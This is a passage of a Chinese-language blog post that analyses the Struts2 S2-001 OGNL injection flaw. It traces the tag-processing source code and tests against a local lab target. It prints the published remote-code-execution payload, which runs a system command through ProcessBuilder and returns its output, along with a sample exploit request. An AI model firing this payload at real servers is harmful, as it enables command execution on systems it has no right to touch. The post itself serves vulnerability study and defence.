<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  <title>Struts2框架: S2-001 漏洞详细分析 - Dean&#39;s notes</title>
  <meta property="og:title" content="Struts2框架: S2-001 漏洞详细分析 - Dean&#39;s notes" />
  <meta name="twitter:title" content="Struts2框架: S2-001 漏洞详细分析 - Dean&#39;s notes" />
  <meta name="description" content="0x00 前言 阅读本文需要具备的知识：
 熟悉J2EE开发, 主要是JSP开发 了解Struts2框架执行流程 了解Ognl表达式  如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.">
  <meta property="og:description" content="0x00 前言 阅读本文需要具备的知识：
 熟悉J2EE开发, 主要是JSP开发 了解Struts2框架执行流程 了解Ognl表达式  如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.">
  <meta name="twitter:description" content="0x00 前言 阅读本文需要具备的知识：
 熟悉J2EE开发, 主要是JSP开发 了解Struts2框架执行流程 了解Ognl表达式  如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.">
  <meta name="author" content="Dean"/>
  <meta property="og:site_name" content="Dean&#39;s notes" />
  <meta property="og:url" content="https://dean2021.github.io/posts/s2-001/" />
  <meta property="og:type" content="article" />
  <meta name="twitter:card" content="summary" />
  <meta name="generator" content="Hugo 0.52" />

  <link rel="stylesheet" href="/css/style.css" media="all" />
  <link rel="stylesheet" href="/css/syntax.css" media="all" />
  <link rel="stylesheet" href="/css/custom.css" media="all" />

  <script src="/js/script.js"></script>
  <script src="/js/custom.js"></script>
  <script defer src="/js/fontawesome.js"></script>
</head>

<body>

<header class="site-header">
  <nav class="site-navi">
    <h1 class="site-title"><a href="/">Dean&#39;s notes</a></h1>
    <ul class="site-navi-items">
      <li class="site-navi-item-home"><a href="/" title="Home">Home</a></li>
      <li class="site-navi-item-categories"><a href="/categories/" title="Categories">Categories</a></li>
      <li class="site-navi-item-tags"><a href="/tags/" title="Tags">Tags</a></li>
      <li class="site-navi-item-archives"><a href="/archives/" title="Archives">Archives</a></li>
      <li class="site-navi-item-books"><a href="/books/" title="Books">Books</a></li>
      <li class="site-navi-item-link"><a href="/link/" title="Links">Links</a></li>
      <li class="site-navi-item-about"><a href="/about/" title="About">About</a></li>

       <li class="site-navi-item-plan"><a href="/posts/plan/" title="plan">Plan</a></li>
    </ul>
  </nav>
</header>
<hr class="site-header-bottom">

  <div class="main" role="main">
    <article class="article">
      
      
      <h1 class="article-title">Struts2框架: S2-001 漏洞详细分析</h1>
      
      <hr class="article-title-bottom">
      <ul class="article-meta">
        <li class="article-meta-date"><time>December 17, 2018</time></li>
        <li class="article-meta-categories">
          <a href="/categories/java/">
            <i class="fas fa-folder"></i>
            java
          </a>&nbsp;
        </li>
        <li class="article-meta-categories">
          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
            <i class="fas fa-folder"></i>
            漏洞分析
          </a>&nbsp;
        </li>
        <li class="article-meta-tags">
          <a href="/tags/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE/">
            <i class="fas fa-tag"></i>
            经典漏洞回顾
          </a>&nbsp;
        </li>
      </ul>
      

      

<h3 id="0x00-前言">0x00 前言</h3>

<p>阅读本文需要具备的知识：</p>

<ol>
<li>熟悉J2EE开发, 主要是JSP开发</li>
<li>了解Struts2框架执行流程</li>
<li>了解Ognl表达式</li>
</ol>

<p>如果你不具备这些知识, 阅读这篇文章将会是一场艰难的旅行.</p>

<h3 id="0x01-漏洞复现">0x01 漏洞复现</h3>

<p>影响漏洞版本:</p>

<blockquote>
<p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p>
</blockquote>

<p>漏洞靶机代码: (下方通过该代码进行分析, 务必下载本地对比运行)</p>

<blockquote>
<p><a href="https://github.com/dean2021/java_security_book/tree/master/Struts2/s2_001">https://github.com/dean2021/java_security_book/tree/master/Struts2/s2_001</a></p>
</blockquote>

<p>公布的POC:</p>

<pre><code>%{#a=(new java.lang.ProcessBuilder(new
java.lang.String[]{&quot;id&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new
java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new
char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new
java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
</code></pre>

<p>精简版POC:</p>

<pre><code>%{1+1}
</code></pre>

<p>这里我们就用这个最精简的POC，靶机代码在本地运行成功后，我们发送请求:</p>

<pre><code>POST /login.action HTTP/1.1
Host: localhost:8080
Content-Length: 19
Cache-Control: max-age=0
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/login.action
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,pt;q=0.7,da;q=0.6
Cookie: JSESSIONID=1478B902172E01647C8DDD6E62390FD1
Connection: close

// password=%{1+1}
password=%25%7B1%2B1%7D

</code></pre>

<p>HTTP响应的内容：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html">HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 18 Dec 2018 09:21:30 GMT
Connection: close
Content-Length: 1222

// ... 省略

<span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;login&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;login&#34;</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&#34;return true;&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;/login.action&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">table</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;wwFormTable&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">td</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;tdLabel&#34;</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;login_password&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;label&#34;</span><span class="p">&gt;</span>password:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;2&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;login_password&#34;</span> <span class="p">/&gt;&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">td</span> <span class="na">colspan</span><span class="o">=</span><span class="s">&#34;2&#34;</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">align</span><span class="o">=</span><span class="s">&#34;right&#34;</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;login_0&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span> <span class="p">/&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
	</code></pre></td></tr></table>
</div>
</div>
<p>注意到input的value属性值为2， 证明成功执行了我们的OGNL表达式%{1+1}, 下面我们开始详细分析。</p>

<hr />

<h3 id="0x02-漏洞分析">0x02 漏洞分析</h3>

<p>通过官网安全公告，我们大概知道问题是出在textfield自定义标签里,如下是我们的index.jsp部分代码:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-html" data-lang="html"><span class="err">&lt;</span>%@taglib prefix=&#34;s&#34; uri=&#34;/struts-tags&#34; %&gt;

<span class="p">&lt;</span><span class="nt">s:form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;login&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">s:textfield</span> <span class="na">label</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">/&gt;</span>
    <span class="p">&lt;</span><span class="nt">s:submit</span><span class="p">/&gt;</span>
<span class="p">&lt;/</span><span class="nt">s:form</span><span class="p">&gt;</span></code></pre></td></tr></table>
</div>
</div>
<p>从代码里我们可以看得到，struts2使用了自定义标签库，也就是/struts-tags, 通过阅读 struts2-core-2.0.8.jar!/META-INF/struts-tags.tld 文件，我们得知这个textfield标签实现类是org.apache.struts2.views.jsp.ui.TextFieldTag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TextFieldTag</span> <span class="kd">extends</span> <span class="n">AbstractUITag</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="n">5811285953670562288L</span><span class="o">;</span>
    <span class="kd">protected</span> <span class="n">String</span> <span class="n">maxlength</span><span class="o">;</span>
    <span class="kd">protected</span> <span class="n">String</span> <span class="n">readonly</span><span class="o">;</span>
    <span class="kd">protected</span> <span class="n">String</span> <span class="n">size</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">TextFieldTag</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">Component</span> <span class="nf">getBean</span><span class="o">(</span><span class="n">ValueStack</span> <span class="n">stack</span><span class="o">,</span> <span class="n">HttpServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">res</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">new</span> <span class="n">TextField</span><span class="o">(</span><span class="n">stack</span><span class="o">,</span> <span class="n">req</span><span class="o">,</span> <span class="n">res</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">populateParams</span><span class="o">()</span> <span class="o">{</span>
        <span class="kd">super</span><span class="o">.</span><span class="na">populateParams</span><span class="o">();</span>
        <span class="n">TextField</span> <span class="n">textField</span> <span class="o">=</span> <span class="o">(</span><span class="n">TextField</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">;</span>
        <span class="n">textField</span><span class="o">.</span><span class="na">setMaxlength</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">maxlength</span><span class="o">);</span>
        <span class="n">textField</span><span class="o">.</span><span class="na">setReadonly</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">readonly</span><span class="o">);</span>
        <span class="n">textField</span><span class="o">.</span><span class="na">setSize</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">size</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="cm">/** @deprecated */</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setMaxLength</span><span class="o">(</span><span class="n">String</span> <span class="n">maxlength</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">maxlength</span> <span class="o">=</span> <span class="n">maxlength</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setMaxlength</span><span class="o">(</span><span class="n">String</span> <span class="n">maxlength</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">maxlength</span> <span class="o">=</span> <span class="n">maxlength</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setReadonly</span><span class="o">(</span><span class="n">String</span> <span class="n">readonly</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">readonly</span> <span class="o">=</span> <span class="n">readonly</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setSize</span><span class="o">(</span><span class="n">String</span> <span class="n">size</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">size</span> <span class="o">=</span> <span class="n">size</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>了解jsp自定义标签的同学应该知道，这时候我们需要找的是doStartTag方法，因为解析标签是从这个方法开始，具体可以参考[2], 通过在TextFieldTag类的ComponentTagSupport父类我们找到doStartTag方法，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">ComponentTagSupport</span> <span class="kd">extends</span> <span class="n">StrutsBodyTagSupport</span> <span class="o">{</span>
    <span class="kd">protected</span> <span class="n">Component</span> <span class="n">component</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nf">ComponentTagSupport</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">abstract</span> <span class="n">Component</span> <span class="nf">getBean</span><span class="o">(</span><span class="n">ValueStack</span> <span class="n">var1</span><span class="o">,</span> <span class="n">HttpServletRequest</span> <span class="n">var2</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">var3</span><span class="o">);</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">doEndTag</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">JspException</span> <span class="o">{</span>
       
        <span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">.</span><span class="na">end</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pageContext</span><span class="o">.</span><span class="na">getOut</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getBody</span><span class="o">());</span>
        <span class="k">this</span><span class="o">.</span><span class="na">component</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">return</span> <span class="n">6</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">doStartTag</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">JspException</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">component</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">getStack</span><span class="o">(),</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">pageContext</span><span class="o">.</span><span class="na">getRequest</span><span class="o">(),</span> <span class="o">(</span><span class="n">HttpServletResponse</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">pageContext</span><span class="o">.</span><span class="na">getResponse</span><span class="o">());</span>
        <span class="n">Container</span> <span class="n">container</span> <span class="o">=</span> <span class="n">Dispatcher</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">getContainer</span><span class="o">();</span>
        <span class="n">container</span><span class="o">.</span><span class="na">inject</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">populateParams</span><span class="o">();</span>
        <span class="kt">boolean</span> <span class="n">evalBody</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">.</span><span class="na">start</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pageContext</span><span class="o">.</span><span class="na">getOut</span><span class="o">());</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">evalBody</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">.</span><span class="na">usesBody</span><span class="o">()</span> <span class="o">?</span> <span class="n">2</span> <span class="o">:</span> <span class="n">1</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">0</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">populateParams</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">.</span><span class="na">setId</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">id</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="n">Component</span> <span class="nf">getComponent</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>通过对doStartTag方法分析，得知该方法仅是对标签的部分属性初始化，并不是漏洞成因。 所以我们继续分析，当标签结束后，调用doEndTag方法， 继续跟进</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java">    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">doEndTag</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">JspException</span> <span class="o">{</span>
       
        <span class="k">this</span><span class="o">.</span><span class="na">component</span><span class="o">.</span><span class="na">end</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">pageContext</span><span class="o">.</span><span class="na">getOut</span><span class="o">(),</span> <span class="k">this</span><span class="o">.</span><span class="na">getBody</span><span class="o">());</span>
        <span class="k">this</span><span class="o">.</span><span class="na">component</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">return</span> <span class="n">6</span><span class="o">;</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>这里的end方法是定义在UIbean类中， 跟进end方法实现</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">UIBean</span> <span class="kd">extends</span> <span class="n">Component</span> <span class="o">{</span>
	   <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">end</span><span class="o">(</span><span class="n">Writer</span> <span class="n">writer</span><span class="o">,</span> <span class="n">String</span> <span class="n">body</span><span class="o">)</span> <span class="o">{</span>

	   	<span class="c1">// 我们跟进这个方法的实现
</span><span class="c1"></span>        <span class="k">this</span><span class="o">.</span><span class="na">evaluateParams</span><span class="o">();</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">.</span><span class="na">end</span><span class="o">(</span><span class="n">writer</span><span class="o">,</span> <span class="n">body</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
            <span class="k">this</span><span class="o">.</span><span class="na">mergeTemplate</span><span class="o">(</span><span class="n">writer</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">buildTemplateName</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">template</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">getDefaultTemplate</span><span class="o">()));</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var7</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">LOG</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;error when rendering&#34;</span><span class="o">,</span> <span class="n">var7</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">popComponentStack</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>跟进this.evaluateParams方法的实现</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">evaluateParams</span><span class="o">()</span> <span class="o">{</span>
    <span class="c1">// 省略n行代码
</span><span class="c1"></span>    <span class="k">if</span> <span class="o">(...){</span>
 
        <span class="c1">// 这个password字符串是解析textfield的name属性得出， 由于代码较多，这里伪代码代替
</span><span class="c1"></span>        <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&#34;password&#34;</span>

        <span class="c1">// 此处是由struts.tag.altSyntax来配置，该属性指定是否允许在Struts2标签中使用OGNL表达式语法
</span><span class="c1"></span>        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">altSyntax</span><span class="o">())</span> <span class="o">{</span>

            <span class="c1">// 将textfield标签的name属性进行拼装， 也就是 exp = &#34;%{password}&#34;
</span><span class="c1"></span>            <span class="n">expr</span> <span class="o">=</span> <span class="s">&#34;%{&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34;}&#34;</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="c1">// UIBaean.java 306行, 跟进this.findValue方法
</span><span class="c1"></span>        <span class="k">this</span><span class="o">.</span><span class="na">addParameter</span><span class="o">(</span><span class="s">&#34;nameValue&#34;</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">findValue</span><span class="o">(</span><span class="n">expr</span><span class="o">,</span> <span class="n">valueClazz</span><span class="o">));</span>
   <span class="o">}</span>
   <span class="o">//</span> <span class="n">省略n行代码</span></code></pre></td></tr></table>
</div>
</div>
<p>跟进 this.findValue(this.value, valueClazz)); 函数实现：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Component</span> <span class="o">{</span>


    <span class="c1">// expr = &#34;%{password}&#34;
</span><span class="c1"></span>
    <span class="kd">protected</span> <span class="n">Object</span> <span class="nf">findValue</span><span class="o">(</span><span class="n">String</span> <span class="n">expr</span><span class="o">,</span> <span class="n">Class</span> <span class="n">toType</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">altSyntax</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">toType</span> <span class="o">==</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
        	<span class="c1">// 跟进该方法
</span><span class="c1"></span>            <span class="k">return</span> <span class="n">TextParseUtil</span><span class="o">.</span><span class="na">translateVariables</span><span class="o">(</span><span class="sc">&#39;%&#39;</span><span class="o">,</span> <span class="n">expr</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">stack</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">altSyntax</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">expr</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;%{&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">expr</span><span class="o">.</span><span class="na">endsWith</span><span class="o">(</span><span class="s">&#34;}&#34;</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">expr</span> <span class="o">=</span> <span class="n">expr</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">2</span><span class="o">,</span> <span class="n">expr</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="n">1</span><span class="o">);</span>
            <span class="o">}</span>

